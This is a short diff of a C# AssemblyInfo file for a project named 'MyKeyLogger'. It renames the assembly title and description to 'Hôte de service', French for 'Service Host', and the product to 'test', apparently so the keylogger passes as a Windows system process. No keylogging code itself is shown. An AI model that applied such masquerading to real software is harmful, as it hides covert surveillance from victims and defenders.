@@ -9,11 +9,11 @@ using System.Runtime.InteropServices;
 // General Information about an assembly is controlled through the following 
 // set of attributes. Change these attribute values to modify the information
 // associated with an assembly.
-[assembly: AssemblyTitle("MyKeyLogger")]
-[assembly: AssemblyDescription("")]
+[assembly: AssemblyTitle("Hôte de service")]
+[assembly: AssemblyDescription("Hôte de service")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("MyKeyLogger")]
+[assembly: AssemblyProduct("test")]
 [assembly: AssemblyCopyright("Copyright 2020")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
